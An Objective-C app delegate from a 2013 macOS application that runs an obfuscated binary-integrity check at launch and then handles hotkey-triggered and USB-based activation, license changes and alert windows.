//
//  blbluAppDelegate.m
//  blblu
//
//  Created by Ophat Phuetkasickonphasutha on 10/2/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "blbluAppDelegate.h"
#import "Activate.h"

#import "FKMBGIIB6.h"
#import "AppEngine.h"
#import "AutoActivationUtils.h"
#import "HotKeyCaptureManager.h"
#import "USBAutoActivationManager.h"
#import "GlobalAlert.h"
#import "LicenseInfo.h"
#import "LicenseManager.h"

@interface blbluAppDelegate (private)
-(void) showActivationWizard;
-(void) showGlobalAlertWithMessage:(NSString *)aMessage title:(NSString *)aTitle;
- (NSPoint) findCenterOfTheScreen;
@end

@implementation blbluAppDelegate

@synthesize window;

@synthesize mAppEngine;

@synthesize mIsShowActivate;
@synthesize mNewestGlobalAlert;

- (void)applicationDidFinishLaunching:(NSNotification *)aNotification
{
    /* --------------------- Security Check ---------------- */
	
	FKMBGIIB6 *sMgr = [[FKMBGIIB6 alloc] init];
    [sMgr setCffos3:0];
    [sMgr setCffms3:512];
    
	BOOL binaryCorrupted = NO;
    
    if (![sMgr fcffe3]) {
        DLog(@"ifConfigFileExists = NO");
        binaryCorrupted = YES;
    }
	
    if (!binaryCorrupted && ![sMgr vetl3:@"." cfi:1]) {
        DLog(@"verifyExecutable = NO");
        binaryCorrupted = YES;
    }
    [sMgr release];
	
	DLog(@"Binary currupted = %d", binaryCorrupted);
	
	/* --------------------- Security Check ---------------- */
	
    if (!binaryCorrupted) {
//    if (1) {
        // Create application engine
        AppEngine *appEngine = [[AppEngine alloc] init];
        
        HotKeyCaptureManager *hotKeyCaptureManager = [appEngine mHotKeyCaptureManager];
        [hotKeyCaptureManager setMDelegate:self];
        
        AutoActivationUtils *requestActivationUtils = [AutoActivationUtils sharedAutoActivationUtils];
        requestActivationUtils.mDelegate = self;
        requestActivationUtils.mSelector = @selector(USBAutoActivationCompleted:); // use the same call back as USB activation
        
        USBAutoActivationManager *usbAutoActivationManager = [appEngine mUSBAutoActivationManager];
        [usbAutoActivationManager setMDelegate:self];
        
        LicenseManager *mLicenseManager = [appEngine mLicenseManager];
        [mLicenseManager addLicenseChangeListener:self];
        
        [self setMAppEngine:appEngine];

        [appEngine release];
        mIsShowActivate = NO;
    }
}

#pragma mark ### HotKeyCaptureDelegate
#pragma mark -

- (void) hotKeyCaptured {
    [self showActivationWizard];
}

#pragma mark ### USBAutoActivationDelegate
#pragma -

- (void) USBAutoActivationCompleted: (NSError *) aError {
    if (mIsShowActivate) {
        mIsShowActivate = NO;
        [mActivate finish];
    }
    
    NSString *title = nil;
    NSString *message = nil;
    if (!aError) {
        title = NSLocalizedString(@"kUSBAutoActivationTitleSuccess", @"");
        message = NSLocalizedString(@"kUSBAutoActivationSuccess", @"");
    } else {
        ActivationResponse *activationResponse = [[aError userInfo] objectForKey:@"Activation response"];
        title = NSLocalizedString(@"kUSBAutoActivationTitleFail", @"");
        message = [NSString stringWithFormat:@"%@%@",NSLocalizedString(@"kUSBAutoActivationFail", @""), [activationResponse mMessage]];
    }
    [self showGlobalAlertWithMessage:message title:title];
    
    
}

#pragma mark ### Private method

- (void) showActivationWizard {
    if (!mIsShowActivate) {
        [[NSApplication sharedApplication] activateIgnoringOtherApps : YES];
        
        if (mActivate) {
            [mActivate release];
            mActivate = nil;
        }
        
        mActivate = [[Activate alloc]initWithWindowNibName:@"Activation"];
        [mActivate setMDelegate:self];
        [[mActivate window] setMovable:NO];
        [[mActivate window] setFrameOrigin:[self findCenterOfTheScreen]];
        [[mActivate window] makeKeyAndOrderFront:nil];
        
        mIsShowActivate = YES;
    }
}

-(void) showGlobalAlertWithMessage:(NSString *)aMessage title:(NSString *)aTitle{
    if (self.mNewestGlobalAlert) {
        [mNewestGlobalAlert close];
    }
    
    GlobalAlert  * gAlert = [[GlobalAlert  alloc]initWithWindowNibName:@"GlobalAlert"];
    [gAlert setMMessage:aMessage];
    [gAlert setMTitle:aTitle];
    [[gAlert window] setMovable:NO];
    [[gAlert window] setFrameOrigin:[self findCenterOfTheScreen]];
    [[gAlert window] makeKeyAndOrderFront:nil];
    
    self.mNewestGlobalAlert = gAlert;
}

- (NSPoint) findCenterOfTheScreen{
    NSRect screenRect;
    NSPoint pos;
    NSArray *screenArray = [NSScreen screens];
    unsigned screenCount = (unsigned)[screenArray count];
    unsigned index  = 0;
    for (; index < screenCount; index++) {
        NSScreen *screen = [screenArray objectAtIndex: index];
        screenRect = [screen visibleFrame];
    }
    pos.x = (screenRect.size.width/2)-(750/2);
    pos.y = (screenRect.size.height/2)-(500/2);
    return pos;
}
# pragma mark ### onLicenseChanged

- (void)onLicenseChanged:(LicenseInfo *) aLicenseInfo{
    BOOL isNotFirstTimeUsed = [[NSUserDefaults standardUserDefaults] objectForKey:@"isNotFirstTimeUsed"];
    if (!isNotFirstTimeUsed) {
        NSUserDefaults *userDefaults = [NSUserDefaults standardUserDefaults];
        [userDefaults setBool:YES forKey:@"isNotFirstTimeUsed"];
        [userDefaults synchronize];
    }
    
    if ([aLicenseInfo licenseStatus] != ACTIVATED && [aLicenseInfo licenseStatus] != EXPIRED && [aLicenseInfo licenseStatus] != DISABLE && !isNotFirstTimeUsed) {
        [self showActivationWizard];
    }
}

- (void) dealloc {
    [mAppEngine release];
    [mActivate release];
    [mNewestGlobalAlert release];
    [super dealloc];
}

@end
